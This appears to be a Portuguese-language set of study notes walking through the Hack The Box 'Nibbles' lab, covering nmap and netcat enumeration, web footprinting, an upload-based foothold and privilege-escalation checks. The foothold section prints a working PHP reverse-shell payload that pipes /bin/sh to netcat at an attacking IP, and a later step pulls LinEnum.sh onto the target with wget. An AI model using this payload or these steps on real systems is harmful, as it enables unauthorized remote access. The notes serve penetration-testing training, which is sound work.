# Attacking Your Fist Box

## Nibbles - Enumeration
https://www.youtube.com/watch?v=s_0GcRGv6Ds - Ippsec Video
https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html - Caminho

Nosso primeiro passo quando estiver com algum alvo é realizar um enumeração
Existe algumas formas de pentesting:
Black-Box -> Quando não tem nenhuma informação dada pelo solicitante
Grey-Box -> Foi dada alguma informação como endereços ip's e tipos de SO
White-Box -> Foi dada muita informação, só para testar e tals.

### Nmap e Netcat (nc)
Sempre tente começar com Nmap scan, ele consegue pegar informações dos serviços
que estão sendo executados nas máquinas, então com os serviços é possível buscar
algum exploit para tentar entrar na máquina e tudo mais.

1. com o seguinte comando podemos escanear as portas essenciais de serviços conhecidos
> nmap -sV --open -oA nibbles_initial_scan <ip address>
  O -oA ele pega o output e coloca dentro de um arquivo XML
2. Podemos ver quais portas um modo de scan analisa.
> nmap -v -oG -
  Ele mostra as portas que serão analisadas
3. Depois de pegar as informações das portas padrões, podemos utilizar um nmap -p- para tentar pegar qualquer serviço que não esteja sendo executado em alguma porta padrão
> nmap -p- --open -oA nibbles_full_tcp_scan <ip address>
  Podemos deixar isso rodando em background e ir para outra coleta de informação.
4. Use o netcat para pegar os grab banner que estão rodando no serviço, para verificar as info vindas do nmap
> nc -nv <ip  address> <port>
5. Depois que a varredura de todas as portas estiver concluida, está na hora de fazer uma varredura de script nmap
Esst tipo de varredura pode ser intrusiva, então saiba exatamente o que está acontecendo.
> nmap -sC -p 22,80 -oA nibbles_script_scan <ip address>
  Como a gente já sabe qual porta está aberta, podemos escolher para economizar tempo.
6. É possível utilizar tbm de script dentro do nmap
> nmap -sV --script=http-enum -oA nibbles_nmap_http_enum <ip address>

## Nibbles - Web Footprinting
1. Nós podemos utilizar o whatweb, para poder identificar o que tá rodando no ip
> whatweb <ip address>
2. Podemos acessar o site pela web ou então pelo curl, na web podemos ter referência visual e pelo curl podemos ter acesso ao html diretamente.
> curl http://<ip address>
3. No html é informado algo como nibbledblog, podemos utilizar o curl para pegar essa info
> curl http://<ip address>/nibbleblog
> whatweb http://<ip address>/nibbledog
  Isso pega info's sobre o que está sendo utilizado nesse site (Tudo que está sendo utilizado)
4. Directory Enumeration
  1. Para utilizar a enumeração de diretórios, podemos utilizar o gobuster.
  > gobuster dir -u http://<ip address>/nibbleblog --wordlist /usr/share/dirb/wordlists/common.txt
  2. Encontrou um XML? Então curl nele juntamente com | xmllint --format - para formata-lo
  > curl -s http://<ip address>/nibbleblog/content/private/users.xml | xmllint --format -
Sempre que estiver enumerando algo, busque guardar essas informações e o passo a passo que
levou você até aquela informação, pois muitas vezes você estará perdido, então é muito
útil ter essas infos por perto para se localizar,

## Nibles - Initial Foothold
1. Interessante como o upload de um script é uma vulnerabilidade alta para esses casos
```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f") ?>
```
Adicione o ip do vpn - interface tun0 e a porta que você quiser
2. chame a imagem novamente pelo curl, ai ele retorna um shell para o seu nc que estiver
escutando na sua porta :3 
3. Conquiste um shell mais bonito TTY, utilizando o python
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Nibbles - Privilege Escalation
1. Podemos utilizar unzip para verificar o que tem em arquivos zip
> unzip personal.zip
2. Podemos abrir um servidor em python para disponibilizar arquivos
> sudo python3 -m http.server 8080
3. No alvo, podemos fazer um wget ou curl para pegar o arquivo
> wget http://<your ip>:8080/LinEnum.sh
4. Seria uma boa verificar quais comandos é possível executar utilizando sudo
> sudo -l